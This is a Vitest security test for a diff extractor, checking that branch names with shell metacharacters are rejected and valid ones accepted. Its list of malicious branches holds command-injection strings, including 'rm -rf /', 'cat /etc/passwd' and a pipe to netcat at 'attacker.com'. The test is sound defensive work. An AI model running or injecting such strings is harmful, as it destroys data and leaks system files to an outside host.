import { describe, it, expect } from 'vitest';
import { extractDiff } from '../../src/diff/extractor.js';

describe('Diff Extractor - Security', () => {
  it('should reject invalid branch names with shell metacharacters', async () => {
    const maliciousBranches = [
      '; rm -rf /',
      '`whoami`',
      '$(whoami)',
      'main; echo hacked',
      'main && cat /etc/passwd',
      'main | nc attacker.com 4444',
    ];

    for (const branch of maliciousBranches) {
      const result = await extractDiff({ baseBranch: branch });

      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error).toContain('Invalid branch name');
      }
    }
  });

  it('should accept valid branch names', async () => {
    const validBranches = [
      'main',
      'develop',
      'feature/new-feature',
      'hotfix/bug-123',
      'release/v1.2.3',
      'user/john.doe/branch',
      'feat_123',
      'fix-issue-456',
    ];

    for (const branch of validBranches) {
      const result = await extractDiff({ baseBranch: branch });

      // May succeed or fail depending on git repo state, but should not reject as invalid
      if (!result.success) {
        expect(result.error).not.toContain('Invalid branch name');
      }
    }
  });

  it('should handle special characters that are safe', async () => {
    const result = await extractDiff({ baseBranch: 'feature/test-123_v2.0' });

    // Should not be rejected as invalid
    if (!result.success) {
      expect(result.error).not.toContain('Invalid branch name');
    }
  });
});
